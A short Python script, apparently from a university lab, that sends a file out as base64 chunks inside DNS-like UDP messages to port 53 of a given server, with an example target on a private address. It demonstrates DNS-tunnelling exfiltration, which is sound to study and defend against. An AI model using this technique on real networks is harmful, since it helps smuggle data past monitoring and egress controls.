import socket
import logging
import os
import hashlib
import base64

def generate_checksum(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

# Configure logging to display information, including the timestamp, log level, and the message
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def encode_base64(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60):
    """
    Send a file as a series of DNS-like queries to a specified server.
    
    Args:
        filename (str): Name of the file to send.
        server_ip (str): IP address of the server to which the file will be sent.
        server_port (int, optional): Port on the server to which the file will be sent. Defaults to 53.
        chunk_size (int, optional): Size of file chunks to read and send. Defaults to 60 bytes.
    """

    # Construct the full path to the file based on the current working directory and the specified filename.
    file_path = os.path.join(os.getcwd(), 'payload', filename)

    # Generate the checksum of the file
    checksum = generate_checksum(file_path)
    logging.info(f"Checksum: {checksum}")

    # Open the file in binary read mode.
    with open(file_path, 'rb') as file:
        packet_number = 0  # Initialize packet number
        while True:
            # Read a chunk of the file of size 'chunk_size' bytes.
            chunk = file.read(chunk_size)
            # If the chunk is empty (i.e., end of file), break out of the loop.
            if not chunk:
                break

            # Increment packet number for each chunk
            packet_number += 1

            # Format packet number with leading zeros
            packet_number_str = str(packet_number).zfill(4)

            # Base64-encode the chunk to ensure it's text-friendly
            chunk_encoded = encode_base64(chunk)

            # Append a pseudo domain to the chunk to simulate a DNS query.
            query = f"{packet_number_str}:{chunk_encoded}.towson.edu:{checksum}"

            # Create a UDP socket.
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
                # Send the 'query' to the specified server IP and port.
                client_socket.sendto(query.encode(), (server_ip, server_port))

                # Log the query sent
                logging.info(f"Sent query: {query}")

if __name__ == "__main__":
    # Example usage of the function.
    send_file_as_dns_queries("image.jpg", "172.16.223.86")
